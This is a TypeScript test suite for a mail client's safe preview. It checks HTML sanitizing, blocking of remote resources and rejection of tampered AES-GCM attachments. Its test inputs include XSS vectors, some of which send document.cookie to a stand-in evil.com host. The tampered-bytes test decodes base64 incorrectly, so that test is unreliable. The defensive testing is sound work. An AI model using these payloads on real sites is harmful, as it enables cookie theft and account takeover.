/**
 * BETA-067 Security acceptance tests:
 * 1. No preview executes active content or fetches remote resources.
 * 2. Tampered/corrupted bytes are rejected before reaching the viewer as "verified".
 */

import { describe, expect, it } from "vitest";
import { decryptAttachment } from "@/services/crypto/open-envelope";
import { sanitizeRawContent, isolateRemoteResources } from "@/features/mail/safe-rendering";

function toHex(bytes: Uint8Array): string {
  return Array.from(bytes)
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

function toBase64(bytes: Uint8Array): string {
  let binary = "";
  for (const b of bytes) binary += String.fromCharCode(b);
  return btoa(binary);
}

async function generateKey(): Promise<CryptoKey> {
  return crypto.subtle.generateKey({ name: "AES-GCM", length: 256 }, true, ["encrypt", "decrypt"]);
}

async function sha256Hex(data: Uint8Array): Promise<string> {
  const digest = await crypto.subtle.digest("SHA-256", data as BufferSource);
  return Array.from(new Uint8Array(digest))
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

describe("BETA-067 Security: No active content execution in preview", () => {
  it("sanitizeRawContent strips all script tags", () => {
    const malicious = `<html><body><script>alert('xss')</script><p>Safe</p></body></html>`;
    const clean = sanitizeRawContent(malicious);
    expect(clean).not.toContain("<script");
    expect(clean).not.toContain("alert('xss')");
    expect(clean).toContain("Safe");
  });

  it("sanitizeRawContent strips iframe tags", () => {
    const malicious = `<iframe src="https://evil.com/steal?cookie=document.cookie"></iframe><p>Content</p>`;
    const clean = sanitizeRawContent(malicious);
    expect(clean).not.toContain("<iframe");
    expect(clean).not.toContain("evil.com");
    expect(clean).toContain("Content");
  });

  it("sanitizeRawContent strips onerror handlers", () => {
    const malicious = `<img src=x onerror="fetch('https://evil.com?t='+document.cookie)">`;
    const clean = sanitizeRawContent(malicious);
    expect(clean).not.toContain("onerror");
    expect(clean).not.toContain("evil.com");
  });

  it("sanitizeRawContent strips javascript: URIs", () => {
    const malicious = `<a href="javascript:alert(1)">click</a>`;
    const clean = sanitizeRawContent(malicious);
    expect(clean).not.toContain("javascript:");
  });

  it("sanitizeRawContent strips data: text/html URIs", () => {
    const malicious = `<img src="data:text/html,<script>alert(1)</script>">`;
    const clean = sanitizeRawContent(malicious);
    expect(clean).not.toContain("data:");
  });

  it("isolateRemoteResources blocks all external URLs", () => {
    const html = `
      <img src="https://tracker.example.com/pixel.gif">
      <video src="https://evil.com/video.mp4"></video>
      <link href="https://evil.com/stylesheet.css" rel="stylesheet">
      <iframe src="https://evil.com/frame"></iframe>
      <p>Safe content</p>
    `;
    const { sanitized, isolation } = isolateRemoteResources(html);
    expect(sanitized).not.toContain("tracker.example.com");
    expect(sanitized).not.toContain("evil.com");
    expect(isolation.blockedCount).toBeGreaterThanOrEqual(3);
    expect(sanitized).toContain("Safe content");
  });

  it("isolateRemoteResources blocks tracking pixels", () => {
    const html = `<img src="https://mail-tracker.com/open?id=12345" width="1" height="1">`;
    const { sanitized } = isolateRemoteResources(html);
    expect(sanitized).not.toContain("mail-tracker.com");
  });

  it("isolateRemoteResources blocks url() references in CSS", () => {
    const html = `<div style="background: url('https://evil.com/bg.png')">Content</div>`;
    const { sanitized } = isolateRemoteResources(html);
    expect(sanitized).not.toContain("evil.com");
    expect(sanitized).toContain("Content");
  });

  it("no script execution vectors survive sanitization", () => {
    const vectors = [
      `<script>fetch('https://evil.com')</script>`,
      `<img onerror="eval('alert(1)')">`,
      `<svg onload="alert(1)">`,
      `<body onload="alert(1)">`,
      `<iframe src="javascript:alert(1)">`,
      `<object data="javascript:alert(1)">`,
      `<embed src="javascript:alert(1)">`,
      `<form action="javascript:alert(1)"><input type="submit">`,
      `<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1)>">`,
    ];

    for (const vector of vectors) {
      const clean = sanitizeRawContent(vector);
      // Should not contain any of these dangerous patterns
      expect(clean).not.toMatch(/<script/i);
      expect(clean).not.toMatch(/onerror/i);
      expect(clean).not.toMatch(/onload/i);
      expect(clean).not.toMatch(/javascript:/i);
      expect(clean).not.toMatch(/eval\(/i);
    }
  });
});

describe("BETA-067 Security: Tampered bytes rejected before reaching viewer", () => {
  it("rejects ciphertext with flipped byte", async () => {
    const key = await generateKey();
    const plaintext = new TextEncoder().encode("original content");
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const sealed = new Uint8Array(
      await crypto.subtle.encrypt(
        { name: "AES-GCM", iv } as AesGcmParams,
        key,
        plaintext as BufferSource,
      ),
    );
    const tag = sealed.slice(sealed.length - 16);
    const ciphertext = toBase64(sealed);

    // Tamper: flip first byte of ciphertext
    const ctBytes = Uint8Array.from(atob(ciphertext));
    ctBytes[0] ^= 0xff;
    const tampered = toBase64(ctBytes);

    await expect(
      decryptAttachment(key, {
        ciphertext: tampered,
        nonce: toHex(iv),
        mac: toHex(tag),
      }),
    ).rejects.toThrow(/decryption failed|auth tag mismatch/);
  });

  it("rejects ciphertext with wrong MAC", async () => {
    const key = await generateKey();
    const plaintext = new TextEncoder().encode("content");
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const sealed = new Uint8Array(
      await crypto.subtle.encrypt(
        { name: "AES-GCM", iv } as AesGcmParams,
        key,
        plaintext as BufferSource,
      ),
    );
    const ciphertext = toBase64(sealed);

    await expect(
      decryptAttachment(key, {
        ciphertext,
        nonce: toHex(iv),
        mac: "00000000000000000000000000000000",
      }),
    ).rejects.toThrow(/auth tag mismatch/);
  });

  it("rejects decryption with wrong key (tampered key)", async () => {
    const key = await generateKey();
    const wrongKey = await generateKey();
    const plaintext = new TextEncoder().encode("secret data");
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const sealed = new Uint8Array(
      await crypto.subtle.encrypt(
        { name: "AES-GCM", iv } as AesGcmParams,
        key,
        plaintext as BufferSource,
      ),
    );
    const ciphertext = toBase64(sealed);

    await expect(
      decryptAttachment(wrongKey, {
        ciphertext,
        nonce: toHex(iv),
        mac: toHex(sealed.slice(sealed.length - 16)),
      }),
    ).rejects.toThrow(/decryption failed/);
  });

  it("rejects when content hash does not match decrypted output", async () => {
    const key = await generateKey();
    const plaintext = new TextEncoder().encode("verify hash");
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const sealed = new Uint8Array(
      await crypto.subtle.encrypt(
        { name: "AES-GCM", iv } as AesGcmParams,
        key,
        plaintext as BufferSource,
      ),
    );
    const ciphertext = toBase64(sealed);

    // Provide a wrong expected hash
    await expect(
      decryptAttachment(key, {
        ciphertext,
        nonce: toHex(iv),
        mac: toHex(sealed.slice(sealed.length - 16)),
        expectedContentHash: "0000000000000000000000000000000000000000000000000000000000000000",
      }),
    ).rejects.toThrow(/content hash mismatch/);
  });

  it("accepts when content hash matches", async () => {
    const key = await generateKey();
    const plaintext = new TextEncoder().encode("verify hash");
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const sealed = new Uint8Array(
      await crypto.subtle.encrypt(
        { name: "AES-GCM", iv } as AesGcmParams,
        key,
        plaintext as BufferSource,
      ),
    );
    const ciphertext = toBase64(sealed);
    const expectedHash = await sha256Hex(plaintext);

    const result = await decryptAttachment(key, {
      ciphertext,
      nonce: toHex(iv),
      mac: toHex(sealed.slice(sealed.length - 16)),
      expectedContentHash: expectedHash,
    });

    expect(result.contentHash).toBe(expectedHash);
    expect(new TextDecoder().decode(result.bytes)).toBe("verify hash");
  });
});
